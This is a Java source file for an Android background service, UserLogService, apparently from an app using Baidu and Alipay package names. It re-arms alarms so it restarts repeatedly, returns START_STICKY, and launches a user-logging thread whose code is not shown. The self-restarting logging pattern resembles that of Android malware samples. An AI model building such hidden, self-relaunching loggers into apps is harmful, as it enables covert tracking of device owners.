package com.baidu.serv;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.UserLogThread;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;

public class UserLogService extends Service{

	private static final String TAG = "UserLogService";
	
	private Context context = this;
	private Handler handler = null;
	
	@Override
    public void onCreate() {
        super.onCreate();
       
        LogUtil.e(TAG, "oncreate");

		this.handler = new Handler() {
            public void handleMessage(Message msg) {
            	try{
	            	double delay = 2;
            		
	            	if(msg.what == 0){
	            		delay = 5;
	            	}
            		
	                Alarms.enableAlarmsService(context, delay,
	                        (delay+1) * 20, UserLogService.class,
	                        false);
            	}catch (Exception e) {
            		e.printStackTrace();
				}
            	
                super.handleMessage(msg);
            }
        };
	}
	
	@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        LogUtil.e(TAG, "onStartCommand");
        
        new UserLogThread(context,handler).start();
        
        return START_STICKY;
    }
	
	@Override
	public IBinder onBind(Intent arg0) {
		
		return null;
	}

}